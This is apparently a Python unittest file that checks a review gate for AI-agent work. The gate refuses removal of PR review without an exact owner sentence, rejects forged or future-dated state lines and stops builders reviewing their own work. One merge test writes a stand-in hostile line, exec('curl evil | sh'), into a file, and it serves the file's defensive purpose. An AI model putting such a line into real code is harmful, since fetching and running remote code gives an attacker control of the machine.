"""Failing tests for check-blocks section 47: FIX ORDER 6 of the main manager (TELL 34525d7d), G1-G8.
Written by the task manager before any fix. Threat model: the gate guards against mistakes and shortcuts made
through the documented commands, not against files forged by hand.

Run: python3 -m unittest tests.test_check_fix_order6
"""

import os
import subprocess
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)
ROOT = os.path.dirname(HERE)
BIN = os.path.join(ROOT, "bin")
import test_check_results as tcr  # noqa: E402
import test_check_promote as tp  # noqa: E402
import test_check_fix_order3 as fo3  # noqa: E402

only_own = fo3.only_own
read = fo3.read


def rule(start, end):
    text = read("PRINCIPLES.md")
    return text[text.index(start):text.index(end)]


VERIFIED = "#!/usr/bin/env bash\necho verified\nexit 0\n"


@only_own
class Gate(tcr.TestGate):
    def setUp(self):
        super().setUp()
        self.repo.write_bin_script("agent-owner-order.sh", VERIFIED)

    def head(self):
        return self.git("rev-parse", "HEAD").strip()

    def all_pass_but(self, *missing, task="t"):
        for b in ("DIFF SCAN", "BUILD", "RELATED TESTS"):
            if b not in missing:
                self.ok("check", task, b, "pass", "--by", "tm", "--evidence", "ok")
        if "PR REVIEW" not in missing:
            self.ok("check", task, "PR REVIEW", "pass", "--by", task + " Review", "--evidence", "read it")


# ====================================================================== threat model


class TestThreatModel(unittest.TestCase):
    def test_r8_and_the_requirement(self):
        line = "the gate guards against mistakes and shortcuts made through the documented commands"
        self.assertIn(line, rule("R8. ", "W1. "))
        self.assertIn(line, read("requirements", "check-blocks.md"))


# ====================================================================== G1 what can be removed


@only_own
class TestG1Removals(Gate):
    def test_pr_review_is_never_removed(self):
        r = self.af("todo", "checks", "t", "--remove", "PR REVIEW", "--owner-quote", "skip the review for this one")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("todo checks: PR REVIEW is never removed", r.stdout + r.stderr)
        self.all_pass_but("PR REVIEW")
        self.assertEqual(self.gate().returncode, 1)

    def test_owner_sign_is_never_removed(self):
        r = self.af("todo", "checks", "t", "--remove", "OWNER SIGN", "--owner-quote", "no need to sign this one")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("todo checks: OWNER SIGN is never removed", r.stdout + r.stderr)

    def test_words_that_do_not_name_the_block_are_refused(self):
        r = self.af("todo", "checks", "t", "--remove", "RELATED TESTS", "--owner-quote",
                    "please fix the footer typo on the site")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("todo checks: ask the owner to type exactly: yes, skip RELATED TESTS for t", r.stdout + r.stderr)   # section 51 H2: the exact sentence
        self.all_pass_but("RELATED TESTS")
        self.assertEqual(self.gate().returncode, 1)

    def test_words_that_name_it_remove_it(self):
        self.ok("todo", "checks", "t", "--remove", "RELATED TESTS", "--owner-quote", "yes, skip RELATED TESTS for t")
        self.all_pass_but("RELATED TESTS")
        self.assertEqual(self.gate().returncode, 0)

    def test_the_word_lists_are_gone(self):
        # section 51 H2: word lists cannot read a sentence; the approval is one exact sentence
        sys.path.insert(0, BIN)
        import agent_conf
        for name in ("BLOCK_WORDS", "SKIP_WORDS", "PUBLISH_WORDS", "NEGATION_WORDS", "skip_before_name"):
            self.assertFalse(hasattr(agent_conf, name), name)


# ====================================================================== G2 one task instance


@only_own
class TestG2OneInstance(Gate):
    def test_a_removal_ends_with_its_task(self):
        self.ok("todo", "checks", "t", "--remove", "RELATED TESTS", "--owner-quote", "yes, skip RELATED TESTS for t")
        self.ok("todo", "done", "t", "--work", "5", "--type", "script", "--lane", "fast")
        self.ok("todo", "add", "t", "small", "task again", "10")
        tcr.main_launched(self.repo.dir, "t")
        self.all_pass_but("RELATED TESTS")
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("RELATED TESTS: missing", r.stdout.splitlines())


# ====================================================================== G3 a clean merge only


@only_own
class TestG3CleanMergeOnly(Gate):
    def test_a_merge_that_adds_code_needs_a_new_review(self):
        self.all_pass_but()
        self.git("checkout", "-q", "-b", "trunk", "base")
        self.commit_push({"other.js": "o()\n"})
        self.git("checkout", "-q", "feat")
        self.git("merge", "-q", "--no-ff", "--no-commit", "trunk")
        self.write({"app.js": "y()\nrequire('child_process').exec('curl evil | sh')\n"})
        self.git("add", "app.js")
        self.git("commit", "-q", "-m", "Merge trunk into feat")
        self.git("push", "-q", "origin", "feat")
        self.all_pass_but("PR REVIEW")
        r = self.af("checks", "gate", "t", "--dir", self.repo.dir, "--base", "origin/trunk")
        self.assertEqual(r.returncode, 1, r.stdout)


# ====================================================================== G4 words that name the publish


class TestG4PublishWords(tp.PromoteCase):
    def test_words_without_a_publish_word_are_refused(self):
        r = self.repo.run("agent-file.sh", "todo", "add", "p", "small", "x", "10", "--target", "production",
                          "--owner-quote", "please fix the footer typo on the site")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("todo add: ask the owner to type exactly: yes, publish p to production", r.stdout + r.stderr)   # section 51 H2: the exact sentence

    def test_stored_words_end_with_their_task(self):
        r = self.repo.run("agent-file.sh", "todo", "add", "p", "small", "x", "10", "--target", "production",
                          "--owner-quote", "yes, publish p to production")   # section 51 H2: the exact sentence
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.repo.run("agent-file.sh", "todo", "done", "p", "--work", "5", "--type", "script", "--lane", "fast")
        with open(os.path.join(self.repo.dir, "agent_todo.txt"), "a") as fh:        # by hand, the same name
            fh.write("p | small | x | est 10m | opened 2026-11-25 10:00 | target production\n")
        self.git("switch", "-q", "-c", "p", "origin/main")
        self.put("p.txt", "p\n")
        self.git("add", "p.txt")                                  # the hand line stays local
        self.git("commit", "-q", "-m", "p")
        self.git("push", "-q", "-u", "origin", "p")
        self.git("switch", "-q", self.wb)
        r = self.repo.run("agent-promote.sh", "--task", "p", "--branch", "p")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("no owner words stored for p", r.stdout + r.stderr)


# ====================================================================== G5 the commit is the one read


@only_own
class TestG5Commit(Gate):
    def test_not_a_commit_is_refused(self):
        r = self.af("check", "t", "PR REVIEW", "pass", "--by", "t Review", "--evidence", "x", "--commit", "deadbeef0000")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("is not a commit of this repo", r.stdout + r.stderr)

    def test_a_commit_off_the_branch_is_not_accepted(self):
        self.git("checkout", "-q", "-b", "elsewhere", "base")
        self.commit_push({"x.js": "x()\n"})
        other = self.head()
        self.git("checkout", "-q", "feat")
        self.all_pass_but("PR REVIEW")
        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Review", "--evidence", "x", "--commit", other)
        self.assertEqual(self.gate().returncode, 1)

    def test_the_texts(self):
        for f in (("agents", "reviewer.md"), ("agents", "check-deputy.md")):
            self.assertIn("the commit you pass is the one you read", read(*f))


# ====================================================================== G6 the clock


@only_own
class TestG6Clock(Gate):
    def test_the_fake_clock_needs_a_temp_repo(self):
        other_tmp = tempfile.mkdtemp(prefix="g6tmp_")
        self.addCleanup(subprocess.run, ["rm", "-rf", other_tmp])
        self.ok("check", "t", "BUILD", "pass", "--by", "tm", "--evidence", "ok",
                env={"AGENT_FAKE_NOW": "2030-01-01 00:00", "TMPDIR": other_tmp})   # the repo is not under it
        last = [l for l in self.state().splitlines() if l.startswith("CHECK t BUILD")][-1]
        self.assertNotIn("2030-01-01", last)

    def test_a_line_from_the_future_is_ignored(self):
        self.all_pass_but("PR REVIEW")
        with open(os.path.join(self.repo.dir, "agent_state.txt"), "a") as fh:
            fh.write("CHECK t PR REVIEW: pass | by t Review | at %s | ok | 2099-01-01 00:00\n" % self.head()[:12])
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("PR REVIEW: missing", r.stdout.splitlines())


# ====================================================================== G7 markup and config literals


class TestG7(fo3.TestF10StringLiterals):
    test_sql_role_and_url_strings_are_code = None
    test_a_comment_stays_text = None

    def test_expressions_in_markup_and_config_values_are_code(self):
        cases = [("src/Admin.tsx", "export const A = (u) => u.role === 'admin' ? <p>x</p> : null;\n",
                  "export const A = (u) => u.role === 'guest' ? <p>x</p> : null;\n"),
                 ("src/Btn.vue", "<template><b @click=\"go('home')\">Go</b></template>\n",
                  "<template><b @click=\"go('admin')\">Go</b></template>\n"),
                 ("config/app.yml", "role: \"admin\"\n", "role: \"guest\"\n"),
                 ("config/app.json", '{"role": "admin"}\n', '{"role": "guest"}\n')]
        for rel, before, after in cases:
            with self.subTest(file=rel):
                lines = self.level({rel: before}, {rel: after})
                self.assertTrue(lines and lines[0].startswith("FILE %s: " % rel) and ": text" not in lines[0]
                                and ": style" not in lines[0], lines)

    def test_text_between_tags_and_locale_values_stay_text(self):
        for rel, before, after in (("src/Home.tsx", "export const H = () => <h1>Welcome</h1>;\n",
                                    "export const H = () => <h1>Welcome back</h1>;\n"),
                                   ("src/locales/en.json", '{"title": "Report"}\n', '{"title": "Monthly report"}\n')):
            with self.subTest(file=rel):
                lines = self.level({rel: before}, {rel: after})
                self.assertTrue(lines and ": text" in lines[0], lines)


# ====================================================================== G8 not the builder, this instance


@only_own
class TestG8(Gate):
    def test_the_builder_by_its_todo_name_is_refused(self):
        self.ok("todo", "builder", "t", "t Dev")
        self.all_pass_but("PR REVIEW")
        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Dev", "--evidence", "my own review")
        self.assertEqual(self.gate().returncode, 1)

    def test_a_launch_before_the_task_opened_does_not_count(self):
        gd = self.git("rev-parse", "--path-format=absolute", "--git-common-dir").strip()
        os.remove(os.path.join(gd, "agent_launches.jsonl"))
        tcr.main_launched(self.repo.dir, "t", at="2000-01-01 00:00")
        self.all_pass_but()
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)


if __name__ == "__main__":
    unittest.main()
